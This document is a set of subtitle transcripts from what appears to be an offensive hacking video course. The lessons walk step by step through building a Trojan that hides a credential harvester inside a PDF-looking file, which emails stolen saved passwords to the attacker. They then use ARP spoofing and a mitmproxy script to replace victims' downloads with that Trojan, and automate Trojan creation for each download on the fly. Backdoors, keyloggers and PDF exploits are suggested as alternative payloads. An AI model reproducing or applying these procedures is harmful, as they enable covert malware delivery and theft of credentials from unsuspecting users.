Now, the next option that we need to set is the O option.

68
00:04:54,710 --> 00:04:59,420
And this is the location where my Trojan is going to be stored.

69
00:04:59,420 --> 00:05:09,710
So it's the combination of these two files and I'm going to do O and store it in my w-w-w HTML so that

70
00:05:09,710 --> 00:05:12,530
I can download it from the windows machine and test it.

71
00:05:13,180 --> 00:05:17,290
And I'm actually just going to call this trojan readme dot exe.

72
00:05:19,110 --> 00:05:24,420
Finally, we're going to set the icon for this new file for the Trojan.

73
00:05:24,420 --> 00:05:26,130
So we're going to do Dash I.

74
00:05:27,670 --> 00:05:30,910
Followed by the location where the icon is stored.

75
00:05:30,940 --> 00:05:34,630
And I'm just going to go down here and go on my downloads to show you.

76
00:05:35,620 --> 00:05:40,590
And as you can see, I have an icon here for a PDF called PDF Dot ICO.

77
00:05:40,600 --> 00:05:42,520
So that's the one I'm going to use.

78
00:05:42,730 --> 00:05:46,300
So it's in route downloads pdf ICO.

79
00:05:47,210 --> 00:05:48,040
And that's it.

80
00:05:48,050 --> 00:05:48,740
We're done.

81
00:05:49,040 --> 00:05:56,720
We can also use the last option in here, the Dash Z, And that option will compress our back door and

82
00:05:56,720 --> 00:05:58,490
put it into an archive.

83
00:05:58,820 --> 00:06:04,940
Now, that's useful if you're going to use the right to left override in here in the file name.

84
00:06:05,030 --> 00:06:09,890
But since I'm not using that, I'm not going to use the Z option, I'm just going to keep it the way

85
00:06:09,890 --> 00:06:10,550
it is.

86
00:06:11,330 --> 00:06:15,350
So I'm going to hit enter and I've done something wrong.

87
00:06:15,350 --> 00:06:18,680
I forgot to put the dash E here for the evil file.

88
00:06:20,650 --> 00:06:21,520
So that's it.

89
00:06:21,520 --> 00:06:21,910
Fixed.

90
00:06:21,910 --> 00:06:23,320
I'm going to hit enter again.

91
00:06:24,550 --> 00:06:29,180
And because the program doesn't show any messages, that means everything went well.

92
00:06:29,200 --> 00:06:31,750
So let's go to var w-w-w in here.

93
00:06:31,930 --> 00:06:32,620
HTML.

94
00:06:33,580 --> 00:06:36,370
And as you can see, I have my readme dot exe.

95
00:06:38,000 --> 00:06:44,120
Now, let me actually show you the Z option, just to show you what it's going to look like.

96
00:06:45,110 --> 00:06:49,770
So if we go back here, you'll see that I have a readme dot zip.

97
00:06:49,790 --> 00:06:52,370
Inside it, you'll see this x.

98
00:06:53,570 --> 00:06:57,230
Now let's go to the Windows machine and test both files.

99
00:06:58,420 --> 00:06:59,560
So I'm here.

100
00:06:59,560 --> 00:07:06,100
I'm going to download it from Kali because I've already put them in via w-w-w HTML so I can just download

101
00:07:06,100 --> 00:07:11,110
it from http ten 2215 eight.

102
00:07:12,460 --> 00:07:15,570
And the first file was called README.txt.

103
00:07:19,340 --> 00:07:20,390
And that's it.

104
00:07:20,390 --> 00:07:21,530
I'm going to save it.

105
00:07:22,070 --> 00:07:23,870
Now let's go and test this.

106
00:07:25,360 --> 00:07:29,800
So as you can see, I have a file that has a PDF icon.

107
00:07:29,830 --> 00:07:31,300
It's called Readme.

108
00:07:31,330 --> 00:07:35,440
Now let's run it and see if we actually get a PDF.

109
00:07:39,080 --> 00:07:43,580
Now, as you can see, I get the Readme that we got from Google.

110
00:07:43,580 --> 00:07:46,820
So this is the Readme for Adobe Acrobat Reader.

111
00:07:46,820 --> 00:07:52,220
So it's a file that the target person should be expecting or it's a file that won't make the target

112
00:07:52,220 --> 00:07:53,030
be suspicious.

113
00:07:53,030 --> 00:07:57,770
At least it's a normal Readme in a PDF at the same time.

114
00:07:57,770 --> 00:08:04,580
Now our evil file should have been executed at the background, so I use the credential harvester that

115
00:08:04,580 --> 00:08:07,670
sends saved passwords to my gmail account.

116
00:08:08,360 --> 00:08:09,830
Okay, let's go to Kali.

117
00:08:10,280 --> 00:08:11,990
I'm going to go on my gmail.

118
00:08:16,760 --> 00:08:24,020
And as you can see, my credential harvester did get executed at the background and I got my password

119
00:08:24,020 --> 00:08:29,690
in here for an account called that I security.org and the password was one, two, three, four, five,

120
00:08:29,690 --> 00:08:30,290
six.

121
00:08:30,650 --> 00:08:34,790
Now I chose to use this with the pdf.

122
00:08:34,790 --> 00:08:36,950
Now you can use any executable.

123
00:08:36,950 --> 00:08:42,500
Like I said, you can use a backdoor, you can use a keylogger, you can even use a normal file if you

124
00:08:42,500 --> 00:08:44,240
want for testing, for testing.

125
00:08:44,240 --> 00:08:46,580
Like I said, I usually use two images.

126
00:08:47,300 --> 00:08:50,870
Now let's go to Windows and just download the zip.

127
00:08:50,870 --> 00:08:52,810
I just want to show you what it looks like.

128
00:08:52,820 --> 00:08:54,560
So I'm going to close this.

129
00:08:55,610 --> 00:08:57,860
So I'm going to delete this one first.

130
00:08:59,440 --> 00:09:02,290
And then I'm just going to download the zip from here.

131
00:09:06,220 --> 00:09:08,850
Just to show you what's going to be inside it.

132
00:09:08,860 --> 00:09:13,270
So if we just right click it and extract here.

133
00:09:15,060 --> 00:09:15,900
You'll see.

134
00:09:15,900 --> 00:09:17,450
I'll get the same Readme.

135
00:09:17,610 --> 00:09:22,350
If we double click it, it'll run the PDF for me as well.

136
00:09:22,350 --> 00:09:27,540
And again it'll run the credential harvester in the background or DCS that you picked.

137
00:09:27,570 --> 00:09:32,730
So the zip option will literally just put the Trojan inside a zip.

138
00:09:33,360 --> 00:09:34,530
Now that's it.

139
00:09:34,560 --> 00:09:38,610
A very simple script that can be used to generate Trojans.

140
00:09:39,150 --> 00:09:42,000
Now, I'd hate for people to be dependent on this.

141
00:09:42,000 --> 00:09:43,430
On generating Trojans.

142
00:09:43,440 --> 00:09:48,570
I highly recommend that you learn how to do it manually, because when you do it manually, you understand

143
00:09:48,570 --> 00:09:54,210
exactly how it works and you'd be able to modify and fix things and even fix this tool if it doesn't

144
00:09:54,210 --> 00:09:54,810
work.

145
00:09:54,960 --> 00:09:58,890
The reason why I'm showing you this tool here, because this is a network hacking.

146
00:09:58,890 --> 00:10:00,600
It's not a social engineering course.

147
00:10:00,600 --> 00:10:05,610
So going into details of creating Trojans will just be distracting.

148
00:10:05,730 --> 00:10:09,900
Also, I want to run a very cool attack at the end of the course.

149
00:10:09,900 --> 00:10:13,350
And for that attack, we'll have to use a script like this.

150
00:10:13,350 --> 00:10:15,490
So stay tuned for that as well.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,590 --> 00:00:07,400
Okay, Now that we know how to create Trojans and we have a working script that will replace downloads

2
00:00:07,400 --> 00:00:14,150
on the fly with any file that we want, let's test this script against a remote computer because we

3
00:00:14,150 --> 00:00:17,120
only tested it against our local machine before.

4
00:00:17,390 --> 00:00:23,780
And to make this example more realistic, we're going to replace the files that the target person downloads

5
00:00:23,780 --> 00:00:29,060
with a Trojan that I created using the method I showed you in the previous lecture.

6
00:00:29,930 --> 00:00:37,820
In this example, I'm actually going to be replacing PDF files with my Trojan, not exe files.

7
00:00:37,970 --> 00:00:44,030
So like I said, using this method you can replace any file with any other file.

8
00:00:44,540 --> 00:00:50,420
So in order to look for PDF files, I'm going to modify this.

9
00:00:50,420 --> 00:00:57,520
So I'm going to be looking for requests that has a URL that ends with a PDF instead of x.

10
00:00:59,500 --> 00:01:00,430
And that's it.

11
00:01:00,430 --> 00:01:00,970
Done.

12
00:01:01,000 --> 00:01:07,360
The next thing that I need to modify is the URL to this file, to the file that I want to replace the

13
00:01:07,360 --> 00:01:08,680
target file with.

14
00:01:09,100 --> 00:01:12,520
So my Trojan is stored in my own web server.

15
00:01:12,520 --> 00:01:17,710
So it's at ten 2258 and it's called index dot zip.

16
00:01:17,740 --> 00:01:21,580
So I actually used the Z flag when I created the Trojan.

17
00:01:22,460 --> 00:01:26,810
So like I said before, I could have just gave you this script and showed you how to use it like this,

18
00:01:26,810 --> 00:01:30,110
but I wanted to show you how to make stuff like this.

19
00:01:30,620 --> 00:01:31,910
So I'm done right now.

20
00:01:31,910 --> 00:01:39,050
This will replace any PDF that the target person tries to access with this zip file in here.

21
00:01:39,500 --> 00:01:45,890
Now let's go ahead and run the attack and we're going to be running it with an ARP spoofing attack.

22
00:01:45,920 --> 00:01:51,710
Like I said before, you can use man in the middle proxy whenever you're the man in the middle, so

23
00:01:51,710 --> 00:01:53,780
you can use it with ARP spoofing attacks.

24
00:01:53,780 --> 00:01:57,800
You can use it if you're using a fake access point or with any other scenario.

25
00:01:57,800 --> 00:01:59,720
When you become the man in the middle.

26
00:01:59,720 --> 00:02:05,780
For us, for convenience, I'm just going to be becoming the man in the middle, using Ettercap, using

27
00:02:05,780 --> 00:02:07,670
an ARP spoofing attack.

28
00:02:07,910 --> 00:02:11,240
And this command we've actually executed a number of times now.

29
00:02:11,240 --> 00:02:13,040
So I'm just going to go over it very quickly.

30
00:02:13,040 --> 00:02:18,050
I'm doing Ettercap TCU ARP remote, do an ARP spoofing attack.

31
00:02:18,260 --> 00:02:25,260
I'm selecting my interface, which is Eth0 Dash s so that it doesn't generate SSL certificates.

32
00:02:25,260 --> 00:02:29,490
And then I have the IP for the gateway followed by the IP for my target.

33
00:02:30,090 --> 00:02:33,690
I'm going to hit enter and this will put me in the middle of the connection.

34
00:02:33,690 --> 00:02:39,870
So everything that the target does is going to be flowing through my computer and Ettercap will be able

35
00:02:39,870 --> 00:02:40,680
to read it.

36
00:02:41,280 --> 00:02:44,670
The next step is going to be running Man in the Middle proxy.

37
00:02:44,670 --> 00:02:49,650
And we're going to do that by doing I'm already at the working directory, so I'm just going to do Man

38
00:02:49,650 --> 00:02:51,600
in the middle dump.

39
00:02:51,930 --> 00:02:58,200
I'm going to give it the location of my script, which is in root basic.py.

40
00:02:58,860 --> 00:03:05,790
And I'm going to add the dash dash transparent argument this time because we want to run this as a transparent

41
00:03:05,790 --> 00:03:08,700
proxy and not as an explicit proxy.

42
00:03:08,700 --> 00:03:13,230
So the browser will not be configured to use man in the middle proxy.

43
00:03:14,160 --> 00:03:20,970
Okay, so we're doing Man in the Middle dump as followed by the location of my script and Transparent

44
00:03:20,970 --> 00:03:26,870
and I've actually covered why we use a transparent proxy in a previous lecture.

45
00:03:26,880 --> 00:03:33,420
So I'm going to hit enter and that's man in the middle proxy running on port 8080.

46
00:03:34,020 --> 00:03:38,190
So when data is going to come to my computer, they're going to come on Port 80.

47
00:03:38,190 --> 00:03:46,290
And like I said before, we'll have to run another command, an IP tables command to redirect any request

48
00:03:46,290 --> 00:03:52,140
or response that comes on port 80 to port 8080 where man in the middle proxy is running.

49
00:03:52,140 --> 00:03:58,680
So that man in the middle proxy will be able to access the flows and manipulate them using the script

50
00:03:58,680 --> 00:03:59,730
that we gave it.

51
00:04:00,030 --> 00:04:04,380
So I'm going to hit enter and that's the command executed and that's it.

52
00:04:04,410 --> 00:04:05,460
We're ready to go.

53
00:04:05,880 --> 00:04:11,250
Let's go to the Windows machine and I'm just going to go to Google.com.

54
00:04:14,210 --> 00:04:17,690
And I'm just going to search for a sample PDF.

55
00:04:19,970 --> 00:04:24,410
Okay, let's assume that our target wants to open the first URL.

56
00:04:26,050 --> 00:04:31,180
You'll see they'll be asked to download a zip, so this won't be very suspicious.

57
00:04:31,180 --> 00:04:33,960
They'll think that the PDF is just inside the zip.

58
00:04:33,970 --> 00:04:35,320
They're going to click okay.

59
00:04:35,320 --> 00:04:37,600
Like I said, you don't have to put a zip in here.

60
00:04:37,600 --> 00:04:41,860
You can put an X, you can replace X to be less suspicious.

61
00:04:41,890 --> 00:04:43,030
It's up to you.

62
00:04:43,030 --> 00:04:48,580
If there was a PDF exploit that's there in the wild and you know that the target is vulnerable too,

63
00:04:48,610 --> 00:04:49,930
then you can use that.

64
00:04:50,110 --> 00:04:58,150
I'm just running an example here and I'm replacing it with a zip file I'm going to download and then

65
00:04:58,150 --> 00:05:03,490
I'm going to open my downloads and uncompressed this zip file.

66
00:05:06,880 --> 00:05:12,360
And as you can see, I get a normal file in here that's called index.

67
00:05:12,370 --> 00:05:19,210
It has an icon of a PDF and the file extension in here, as you can see, it's called index dot PDF.

68
00:05:19,210 --> 00:05:21,100
So it has a PDF extension.

69
00:05:21,550 --> 00:05:24,910
So everything looks normal, everything looks good to the user.

70
00:05:24,940 --> 00:05:28,240
The user is going to double click this to run it.

71
00:05:29,640 --> 00:05:36,660
As you can see, they get a normal PDF that they can browse, but at the same time this executed my

72
00:05:36,660 --> 00:05:37,440
evil file.

73
00:05:37,440 --> 00:05:39,120
So your evil file can be anything.

74
00:05:39,120 --> 00:05:42,690
It can be a backdoor, it could be a keylogger.

75
00:05:42,690 --> 00:05:49,350
In my case, I have a credential harvester that's going to send the saved passwords to my own email.

76
00:05:49,350 --> 00:05:57,090
So if I go to Kali and go to my browser, I'm going to hit the refresh.

77
00:05:57,780 --> 00:06:05,280
And as you can see, I have a new email called Report and if I open my attachment.

78
00:06:06,380 --> 00:06:13,700
You'll see my credential harvester got me the username for my target's google account.

79
00:06:13,730 --> 00:06:20,330
The login was say that I security.org and the password is 123456.

80
00:06:20,930 --> 00:06:24,980
So that was just an example of a file that you can use.

81
00:06:24,980 --> 00:06:31,670
You can replace this with a keylogger, you can replace downloads with a Trojan, with a virus with

82
00:06:31,670 --> 00:06:35,780
a backdoor, so you can hack the target computer and gain full control over it.

83
00:06:35,810 --> 00:06:37,400
You can replace it with anything.

84
00:06:37,400 --> 00:06:40,550
So you're only limited by your imagination, really.

85
00:06:41,270 --> 00:06:45,890
And using this method, you can actually build so much more attacks.

86
00:06:45,890 --> 00:06:53,840
So I just showed you a very simple example of how we can analyze, intercept, write a response and

87
00:06:53,840 --> 00:06:55,280
then replace downloads.

88
00:06:55,280 --> 00:07:01,460
But you can use the idea to, for example, redirect people to different URLs, inject different types

89
00:07:01,460 --> 00:07:03,860
of codes and even the files themselves.

90
00:07:03,860 --> 00:07:07,020
You can use so many files and so many ideas.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,690 --> 00:00:06,870
So far we know how to intercept and replace downloads using man in the middle proxy.

2
00:00:07,440 --> 00:00:09,930
We know how to create a Trojan.

3
00:00:09,960 --> 00:00:14,820
Therefore, we can combine any file with an evil file.

4
00:00:15,450 --> 00:00:23,070
We also know how to manually read, analyze, and create our own man in the middle proxy scripts.

5
00:00:23,580 --> 00:00:30,810
So let's try to combine these three things that we learned so far and come up with something very powerful.

6
00:00:31,680 --> 00:00:38,760
Let's try to write a man in the middle proxy script that the replace files when the user download them

7
00:00:38,760 --> 00:00:41,310
just like the one that we did before.

8
00:00:41,320 --> 00:00:48,120
But when we use the one before, we had to create the Trojan first and then replace the download with

9
00:00:48,120 --> 00:00:52,230
that Trojan and I said try to use a file that looks generic.

10
00:00:52,230 --> 00:00:58,410
For example, I used a Readme file to display to the user so that the user doesn't get suspicious.

11
00:00:58,800 --> 00:01:05,070
Now what I want to do, I want to create a man in the middle script that will, whenever the target

12
00:01:05,070 --> 00:01:12,450
person tries to download something, it will create a Trojan that will show the thing that the target

13
00:01:12,450 --> 00:01:17,130
person is downloading and at the same time run my evil file.

14
00:01:17,130 --> 00:01:24,570
So instead of using a generic file to show to the user the script that we're going to create is going

15
00:01:24,570 --> 00:01:31,690
to make a Trojan for each file that the target person downloads as the target person downloads, the

16
00:01:31,690 --> 00:01:37,540
file man in the middle proxy is going to create the Trojan for us and serve it to the user.

17
00:01:37,720 --> 00:01:43,540
When the user downloads the file, they'll get the file that they actually expect and at the same time,

18
00:01:43,540 --> 00:01:46,300
my evil file will run at the background.

19
00:01:46,330 --> 00:01:52,330
So this will not be suspicious at all because the user will not get something similar to what they expect.

20
00:01:52,330 --> 00:01:55,210
They'll get exactly the file that they're looking for.

21
00:01:55,240 --> 00:01:58,930
But at the same time, our backdoor is going to run in the background.

22
00:01:59,440 --> 00:02:03,970
Now, I think this is pretty cool and I think it will work against a lot of people.

23
00:02:04,300 --> 00:02:06,610
So let's see how we can do that.

24
00:02:07,150 --> 00:02:12,520
Now, again, this is not a programming course, so I'm going to try to keep the programming as simple

25
00:02:12,520 --> 00:02:13,480
as possible.

26
00:02:13,870 --> 00:02:20,440
So right now I have the basic script that we wrote before that will replace any X that the target person

27
00:02:20,440 --> 00:02:24,250
downloads with the X on this link in here.

28
00:02:24,760 --> 00:02:28,600
So we're going to use this as our base and we're going to work from here.

29
00:02:28,600 --> 00:02:32,280
So we're going to modify this file to achieve our goal.

30
00:02:32,280 --> 00:02:34,440
So right now this script is very good.

31
00:02:34,440 --> 00:02:41,970
It whenever the target person requests a URL that ends with a dot x, the flow is going to come in here.

32
00:02:42,270 --> 00:02:44,940
Then this line will do the replacement.

33
00:02:45,540 --> 00:02:53,760
So before we do the replacement we want to create file dot x, we want to add code that will create

34
00:02:53,790 --> 00:02:58,920
a Trojan in here so that we serve that Trojan to the user on this line.

35
00:02:59,370 --> 00:03:04,800
Therefore, all the code that I'm going to use right now is going to go before this line so that at

36
00:03:04,800 --> 00:03:09,990
the end, whenever we're done with creating the Trojan, we will serve it to the user in here using

37
00:03:09,990 --> 00:03:10,770
this line.

38
00:03:11,460 --> 00:03:18,870
Now, we actually don't need too much code because we have a tool that will create the Trojan for us.

39
00:03:18,900 --> 00:03:25,800
So the tool is the Trojan factory that I showed you before, and we can use this tool to create the

40
00:03:25,800 --> 00:03:27,810
Trojan for us on the fly.

41
00:03:27,810 --> 00:03:30,000
And here in Man in the Middle Proxy.

42
00:03:30,420 --> 00:03:36,640
Now we can actually just import the functions and use them, but that will involve too much programming.

43
00:03:36,640 --> 00:03:37,690
And I don't want that.

44
00:03:37,690 --> 00:03:41,170
I want to I want to keep the programming as simple as possible.

45
00:03:41,170 --> 00:03:43,570
So I'm just going to call the tool.

46
00:03:43,570 --> 00:03:50,110
So I'm going to run the tool from within the script using the command so we can actually run system

47
00:03:50,110 --> 00:03:51,580
commands from Python.

48
00:03:51,580 --> 00:03:52,840
And that's what I'm going to do.

49
00:03:52,840 --> 00:03:57,970
I'm literally going to run the exact same command that we seen in the previous lecture when we were

50
00:03:57,970 --> 00:04:00,850
using the Trojan factory.

51
00:04:00,850 --> 00:04:08,800
I'm just going to run it from within this script, so I'm going to go up and I actually have the command

52
00:04:08,800 --> 00:04:12,520
in here, the command that we ran before, so I'm just going to copy it.

53
00:04:14,290 --> 00:04:17,230
And I'm going to come here and paste it.

54
00:04:17,600 --> 00:04:20,950
I'm just going to remove the Z because I don't want to create an archive.

55
00:04:22,660 --> 00:04:29,890
So as we've seen in a previous lecture, this command will create a Trojan that will display Readme

56
00:04:29,920 --> 00:04:37,120
dot PDF to the user and it will run the evil file stored in here in the background.

57
00:04:38,190 --> 00:04:47,610
It will also use the icon that's stored in root downloads PDF and the result file is going to be stored

58
00:04:47,610 --> 00:04:51,950
in var w-w-w HTML and the name of it is readme.txt.

59
00:04:52,260 --> 00:04:58,020
And I spent a full lecture explaining how to use this tool and how to specify all of these values.

60
00:04:58,020 --> 00:05:00,720
So I'm not going to spend too much time on it right now.

61
00:05:01,200 --> 00:05:04,230
Now, as we know, this is a bash command.

62
00:05:04,680 --> 00:05:10,890
So in order to run a bash command from Python, we have to use a function.

63
00:05:11,190 --> 00:05:15,030
The function is called subprocess dot call.

64
00:05:15,300 --> 00:05:17,940
And I'm going to write it in here in the next line.

65
00:05:17,940 --> 00:05:21,360
So the function for me is going to be called subprocess.

66
00:05:23,890 --> 00:05:27,490
Dot com and I'm going to open two brackets.

67
00:05:28,210 --> 00:05:32,050
Now, the first argument in this function is going to be the command.

68
00:05:32,050 --> 00:05:34,300
So it's going to be this full line in here.

69
00:05:35,650 --> 00:05:41,680
The next argument is going to specify the shell attribute for this function.

70
00:05:41,680 --> 00:05:43,720
And I'm going to set this to true.

71
00:05:45,030 --> 00:05:48,810
So that it shows the output on screen.

72
00:05:49,560 --> 00:05:52,170
And then I'm just going to copy all of this line.

73
00:05:54,720 --> 00:05:59,340
And paste it in here between these two quotations.

74
00:06:00,780 --> 00:06:02,310
And that went down the line.

75
00:06:02,310 --> 00:06:06,150
So I'm just going to do Backspace to Go Up and that's it.

76
00:06:07,260 --> 00:06:13,980
So all we're doing now, we're using a library called Subprocess and we're using a method called call.

77
00:06:13,980 --> 00:06:19,110
And what this method does, it runs a Linux command, it runs a bash command.

78
00:06:19,110 --> 00:06:25,020
So you can you can literally use any bash command in here between those two quotations you can use.

79
00:06:25,050 --> 00:06:28,950
LS pwd CD anything you want.

80
00:06:29,370 --> 00:06:36,540
Now, the command that I'm interested in is the command that will use the Trojan factory tool for me

81
00:06:36,540 --> 00:06:38,160
and create a Trojan.

82
00:06:38,640 --> 00:06:44,520
Therefore, I pasted that command in here between the two quotation marks.

83
00:06:45,240 --> 00:06:47,880
Now, if we look at this command.

84
00:06:49,000 --> 00:06:55,300
You'll see that it's calling Python and then it's calling a file called Trojan factory.py.

85
00:06:56,230 --> 00:07:04,840
Now for us to use this in the terminal, we had to first navigate to opt Trojan factory and then use

86
00:07:04,840 --> 00:07:11,020
the command because Trojan factory.py is stored in this path in here.

87
00:07:11,500 --> 00:07:18,820
So if we want to run this tool from outside its directory, we have to give its full location.

88
00:07:19,640 --> 00:07:21,050
So let me show you an example.

89
00:07:21,060 --> 00:07:28,100
If I just go to CD root and then do python Trojan factory.py.

90
00:07:29,930 --> 00:07:32,060
It will say there is no such file.

91
00:07:32,360 --> 00:07:38,060
So if we want to run this tool from outside its directory, we have to give the full location.

92
00:07:38,060 --> 00:07:44,660
So I have to do opt Trojan factory followed by the tool name.

93
00:07:45,770 --> 00:07:47,240
And I misspelled that.

94
00:07:52,380 --> 00:07:55,020
And now it's calling the program.

95
00:07:55,590 --> 00:07:59,970
Now, I've actually just noticed I misspelled the word Trojan in here.

96
00:07:59,970 --> 00:08:04,860
That should be Trojan with no n, so I'll fix that on GitHub, but it doesn't really matter.

97
00:08:04,860 --> 00:08:07,800
The program works properly, so that's just a file name.

98
00:08:08,100 --> 00:08:15,480
So what I'm trying to say in here is we need to give the full location where the tool is stored.

99
00:08:15,480 --> 00:08:19,590
So I'm going to go down here and modify this.

100
00:08:19,590 --> 00:08:27,450
So instead of just doing Python Trojan Factory, we're going to do Python opt Trojan factory.

101
00:08:31,000 --> 00:08:34,840
And then it's calling Trojan factory dot pi.

102
00:08:35,890 --> 00:08:41,920
Now, the next thing that we need to modify is the file, the file that will be displayed to the user

103
00:08:41,920 --> 00:08:43,810
when they download something.

104
00:08:43,840 --> 00:08:46,960
Now I'll show you how to do that in the next lecture.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:01,050 --> 00:00:01,620
Okay.

2
00:00:01,620 --> 00:00:04,530
Now, so far we haven't done too much.

3
00:00:04,560 --> 00:00:10,980
The command that we're using is still identical to the command that we used before when we generated

4
00:00:10,980 --> 00:00:12,630
the Trojan from the terminal.

5
00:00:12,660 --> 00:00:20,880
The only difference is instead of doing python trojan factory.py, we're doing python of trojan factory.

6
00:00:20,910 --> 00:00:22,740
Trojan factory.py.

7
00:00:22,980 --> 00:00:28,980
So we appended the full path of where Trojan factory is installed.

8
00:00:30,000 --> 00:00:37,020
The reason why we're using the full location to the Trojan factory file because before we had to CD

9
00:00:37,020 --> 00:00:40,740
into the directory first and then execute Trojan factory.

10
00:00:40,770 --> 00:00:42,830
Now we're not going to be doing that.

11
00:00:42,840 --> 00:00:48,450
We're going to be executing the tool from outside its directory and that's why we had to put the full

12
00:00:48,450 --> 00:00:49,050
path.

13
00:00:49,710 --> 00:00:57,240
Now, as you know from the previous lecture, we used Dash F to specify the file, the front file that

14
00:00:57,240 --> 00:00:58,830
will be displayed to the user.

15
00:00:59,340 --> 00:01:07,020
And in that lecture we used a Readme file for Acrobat Reader, so we just used a generic file.

16
00:01:07,050 --> 00:01:14,540
Now what we want to do now is we want to generate a Trojan for each file that the target person downloads.

17
00:01:14,550 --> 00:01:19,500
So for each file that they download, they should see the file that they're expecting.

18
00:01:19,500 --> 00:01:21,540
So the front file is going to be different.

19
00:01:21,540 --> 00:01:26,580
It's going to be variable depending on the file that the user is downloading.

20
00:01:27,090 --> 00:01:34,450
Now, luckily, man in the middle proxy scripts are written in Python, so we can just create a variable

21
00:01:34,450 --> 00:01:35,110
store.

22
00:01:35,110 --> 00:01:41,710
The value of the file that's being downloaded in that variable and then use that variable here.

23
00:01:42,100 --> 00:01:44,820
So let's first create a variable.

24
00:01:44,830 --> 00:01:46,360
So I'm going to come here.

25
00:01:47,110 --> 00:01:48,760
And I'm going to create a variable.

26
00:01:48,760 --> 00:01:50,500
Let's call it front file.

27
00:01:53,640 --> 00:01:58,980
And that's going to be equal to the file that the user is downloading.

28
00:01:59,310 --> 00:02:06,070
Now, if you remember when we first wrote the script, we said flow is a container or a variable.

29
00:02:06,090 --> 00:02:11,010
So right now we're just creating another variable called float front file.

30
00:02:11,460 --> 00:02:20,580
Now we also know from the previous lecture that flow dot request dot URL contains the URL of the file

31
00:02:20,580 --> 00:02:22,740
that the target person is downloading.

32
00:02:22,920 --> 00:02:24,180
So this is perfect.

33
00:02:24,180 --> 00:02:26,050
This is exactly what I'm looking for.

34
00:02:26,070 --> 00:02:32,010
I'm looking for the URL that the target person is downloading and I want to use that as the front file.

35
00:02:32,490 --> 00:02:34,440
So I'm just going to copy this.

36
00:02:35,140 --> 00:02:36,940
And I'm going to paste it here.

37
00:02:37,630 --> 00:02:44,980
Now, front file contains the direct URL to the file that the target person is downloading.

38
00:02:45,490 --> 00:02:54,550
So all we have to do now is use front file after the dash f in here, after the dash f argument in the

39
00:02:54,550 --> 00:02:56,110
Trojan factory command.

40
00:02:56,410 --> 00:02:57,370
This way.

41
00:02:57,370 --> 00:03:06,040
Whatever file that the user downloads will be replaced with this and the Trojan will be embedded with

42
00:03:06,040 --> 00:03:06,940
that file.

43
00:03:07,180 --> 00:03:12,130
So I'm going to delete this and paste my variable in here.

44
00:03:12,130 --> 00:03:19,360
But before I do that, I can't just paste a variable inside two quotation marks because quotation marks

45
00:03:19,360 --> 00:03:23,590
mean that whatever goes inside it is just normal text.

46
00:03:23,590 --> 00:03:24,900
It's not variables.

47
00:03:24,910 --> 00:03:31,090
So I have to close these quotation marks because if I just scroll here to the left, you'll see that

48
00:03:31,090 --> 00:03:37,520
I have a quotation mark here for the start of the command and I have one at the end of the command in

49
00:03:37,520 --> 00:03:38,090
here.

50
00:03:38,950 --> 00:03:44,230
So I'm going to have to close these quotation marks in here after the F argument.

51
00:03:45,360 --> 00:03:50,460
And then I'm going to type spaces and put my variable in here.

52
00:03:50,820 --> 00:03:52,950
Now, Python will complain about that.

53
00:03:52,950 --> 00:03:57,920
You can't just throw a variable in the middle of a command or in the middle of a string.

54
00:03:57,930 --> 00:04:01,920
So you're going to have to put a plus after it and a plus before it.

55
00:04:03,380 --> 00:04:04,290
And that's it.

56
00:04:04,310 --> 00:04:05,090
It's done.

57
00:04:05,240 --> 00:04:10,280
So if you just look at the command now, I'm actually going to zoom out a little bit and hopefully it

58
00:04:10,280 --> 00:04:11,600
won't be too small.

59
00:04:12,910 --> 00:04:18,460
So you can see we're just doing Python and then we're giving the full location of the file that we want

60
00:04:18,460 --> 00:04:20,260
to run, which is Trojan factory.

61
00:04:20,770 --> 00:04:22,930
And then we're just using the tool normally.

62
00:04:22,930 --> 00:04:27,010
First of all, we're giving dash F to specify the front file.

63
00:04:27,250 --> 00:04:33,700
After that, I'm closing the mark and I'm telling that I want you to, to substitute whatever value

64
00:04:33,700 --> 00:04:35,980
stored in this variable in here.

65
00:04:36,400 --> 00:04:41,920
Then I'm using the plus to append open a quotation mark and finish up the command.

66
00:04:42,460 --> 00:04:45,860
The rest of the command is going to stay exactly the same.

67
00:04:45,880 --> 00:04:49,330
So I'm going to be using an evil file called Evil dot exe.

68
00:04:49,570 --> 00:04:57,070
It's stored in my var w-w-w HTML and therefore its direct url is going to be this one.

69
00:04:59,290 --> 00:05:02,140
I'm also going to store this in my.

70
00:05:03,610 --> 00:05:07,020
HTML and I actually don't want to call it Readme this time.

71
00:05:07,030 --> 00:05:09,310
I'm just going to call it file dot txt.

72
00:05:11,840 --> 00:05:19,250
And then we're setting the icon to root downloads pdf ICO so the rest of the command is pretty much

73
00:05:19,250 --> 00:05:20,120
the same.

74
00:05:20,630 --> 00:05:27,290
Now you can actually improve this script and if you know a little bit about Python, you can make this

75
00:05:27,290 --> 00:05:34,310
script automatically call the file in here a name that represents the file that the target is downloading.

76
00:05:34,310 --> 00:05:40,130
So you can just call this file the same name as the file that the target person wants to download.

77
00:05:40,730 --> 00:05:45,110
I'm not going to show it in here because I don't want to get too much into programming.

78
00:05:45,110 --> 00:05:50,240
This is not a programming course and I know a lot of students in here that don't have any programming

79
00:05:50,240 --> 00:05:53,360
experience, so I don't want to make this too complicated.

80
00:05:53,930 --> 00:06:00,770
So now we're pretty much done, and this is just a small few things that we need to add.

81
00:06:01,130 --> 00:06:09,170
First, I'm going to add a single quote here inside the command and another single quote in here after

82
00:06:09,170 --> 00:06:09,590
it.

83
00:06:09,740 --> 00:06:16,650
This is just to wrap the front file variable, just to make sure that if there were any characters in

84
00:06:16,650 --> 00:06:23,250
here that might break the terminal command, they won't do that because I'm wrapping them in here.

85
00:06:24,070 --> 00:06:31,690
Also because we're using subprocess, we actually have to import this library the same way that we imported

86
00:06:31,690 --> 00:06:33,490
man in the middle proxy here.

87
00:06:33,730 --> 00:06:37,450
So we just have to go here and do import.

88
00:06:38,300 --> 00:06:39,800
Sub process.

89
00:06:42,250 --> 00:06:42,900
Okay.

90
00:06:42,910 --> 00:06:47,830
Finally, the last thing that I want to show this this script now is all done.

91
00:06:47,830 --> 00:06:48,730
It's perfect.

92
00:06:48,760 --> 00:06:55,330
There is one thing that I want to do is I want to add in here a hash sign.

93
00:06:56,020 --> 00:07:05,680
The reason why I'm doing this is if you don't do this, the user will get stuck in a loop because this

94
00:07:05,680 --> 00:07:13,300
